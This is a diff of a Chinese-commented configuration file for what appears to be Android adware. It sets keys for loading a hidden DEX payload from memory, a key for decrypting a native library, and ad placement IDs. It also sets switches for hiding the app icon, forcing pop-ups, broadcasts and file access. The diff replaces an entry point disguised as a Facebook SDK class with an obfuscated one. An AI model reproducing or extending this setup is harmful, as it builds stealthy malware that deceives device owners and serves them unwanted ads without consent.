@@ -1,10 +1,13 @@
 {
   //用-分割开
-  //A配置刷新间隔 单位分钟
+  //A配置刷新间隔 单位秒
   //B配置刷新间隔 单位秒
-  "gazelle_tim": "60-60",
-  //不上报日志(cc1)、用户B(lle),用户A(gaze)
+  //admin 当天请求上限
+  "gazelle_tim": "3600-60-10",
+  //用户B(lle),用户A(open)
   "gazelle_gos_s": "gaze",
+  // 是否上报日志
+  "log_sta": true,
   // Facebook id
   "gazelle_fbi": "3616318175247400",
   // Facebook token
@@ -27,36 +30,39 @@
   // 广告id 低价值
   "dahlia_idL": "981772963",
   // 进入dex需要的信息
-  "igl_dex_path": "dalvik.system.InMemoryDexClassLoader=java.lang.ClassLoader=getClassLoader=iosk.gif=ki2j4z3m6j7aks12",
+  "igl_dex_path": "dalvik.system.InMemoryDexClassLoader=java.lang.ClassLoader=l2oi4kz6m7aj8sg9",
   // 入口
-  "types_str": "com.facebook.appevents.AppEventLogger",
+  "types_str": "j.i",
   // 解密so的key
   "igloo_ks": "opl12is4jz4h5szb",
-  // 隐藏icon
-  "igloo_name": "freshasg"
+  // 隐藏/外弹/广播/文件开关
+  "igloo_name": "freshasg-plikz-google-bigo"
 }
 
 // 配置A
 {
-  "gazelle_tim": "60-60",
-  "gazelle_gos_s": "gaze",
+  "gazelle_tim": "3600-60-10",
+  "gazelle_gos_s": "open",
+  "log_sta": true,
+  "dahlia_na": "",
   "gazelle_fbi": "3616318175247400",
   "gazelle_fbt": "3616318175247400",
-  "igl_dex_path": "",
   "dahlia_t": "30-30-60-8-16-80-500-800-40",
-  "dahlia_na": "",
   "dahlia_id_h": "981772962",
   "dahlia_idL": "981772963",
-  "igloo_miz": "ki2j4z3m6j7aks12qe3e",
+  "igl_dex_path": "dalvik.system.InMemoryDexClassLoader=java.lang.ClassLoader=l2oi4kz6m7aj8sg9",
+  "types_str": "j.i",
   "igloo_ks": "opl12is4jz4h5szb",
-  "igloo_name": "freshasg"
+  "igloo_name": "freshasg-plikz-google-bigo"
 }
 
-//配置B
+
+// 配置B
 {
-  "gazelle_tim": "60-60",
+  "gazelle_tim": "3600-60-10",
   "gazelle_gos_s": "lle",
+  "log_sta": true,
+  "dahlia_na": "",
   "gazelle_fbi": "3616318175247400",
   "gazelle_fbt": "3616318175247400"
 }
-
